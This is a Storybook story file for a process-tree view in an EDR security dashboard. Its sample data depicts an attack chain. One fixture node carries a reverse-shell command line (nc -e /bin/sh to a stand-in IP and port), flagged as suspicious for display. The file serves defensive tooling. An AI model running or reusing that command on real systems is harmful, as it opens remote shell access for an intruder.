import type { Meta, StoryObj } from '@storybook/react';

import { ProcessTree } from './ProcessTree';

import type { ProcessNodeDTO } from '@/types/edr';


// ---------------------------------------------------------------------------
// Sample data — small attack chain: systemd → bash → python3 → nc (suspicious)
//                                                          └─→ sh
//
// Node list is flat (as returned by the API); the `ProcessTree` component
// receives already-assembled roots from `buildProcessTree`, so we wire the
// children manually here for the story.
// ---------------------------------------------------------------------------

const systemd: ProcessNodeDTO = {
  pid: 1,
  ppid: 0,
  name: 'systemd',
  cmdline: '/sbin/init',
  user: 'root',
  startTime: '2026-07-24T08:00:00Z',
  suspicious: false,
};

const bash: ProcessNodeDTO = {
  pid: 1024,
  ppid: 1,
  name: 'bash',
  cmdline: '/bin/bash',
  user: 'root',
  startTime: '2026-07-24T08:01:00Z',
  suspicious: false,
};

const python3: ProcessNodeDTO = {
  pid: 2048,
  ppid: 1024,
  name: 'python3',
  cmdline: 'python3 exploit.py',
  user: 'root',
  startTime: '2026-07-24T08:02:00Z',
  suspicious: false,
};

const nc: ProcessNodeDTO = {
  pid: 4096,
  ppid: 2048,
  name: 'nc',
  cmdline: 'nc -e /bin/sh 10.0.0.1 4444',
  user: 'root',
  startTime: '2026-07-24T08:03:00Z',
  suspicious: true,
};

const sh: ProcessNodeDTO = {
  pid: 4097,
  ppid: 2048,
  name: 'sh',
  cmdline: '/bin/sh',
  user: 'root',
  startTime: '2026-07-24T08:03:01Z',
  suspicious: false,
};

// Wire the tree manually — mirrors what buildProcessTree would produce.
const attackChain: ProcessNodeDTO[] = [
  {
    ...systemd,
    children: [
      {
        ...bash,
        children: [
          {
            ...python3,
            children: [
              { ...nc, children: [] },
              { ...sh, children: [] },
            ],
          },
        ],
      },
    ],
  },
];

// ---------------------------------------------------------------------------
// Meta
// ---------------------------------------------------------------------------

const meta = {
  title: 'HiveArmor/EDR/ProcessTree',
  component: ProcessTree,
  tags: ['autodocs'],
  parameters: {
    layout: 'padded',
  },
} satisfies Meta<typeof ProcessTree>;

export default meta;
type Story = StoryObj<typeof meta>;

// ---------------------------------------------------------------------------
// Stories
// ---------------------------------------------------------------------------

/** Five-node attack chain: systemd → bash → python3 → nc (suspicious) / sh */
export const Default: Story = {
  args: {
    processes: attackChain,
    isLoading: false,
    isError: false,
    error: null,
  },
};

/** Skeleton / spinner state — no ECharts instance is mounted. */
export const Loading: Story = {
  args: {
    processes: [],
    isLoading: true,
    isError: false,
    error: null,
  },
};

/** No process data returned for the selected time window. */
export const Empty: Story = {
  args: {
    processes: [],
    isLoading: false,
    isError: false,
    error: null,
  },
};
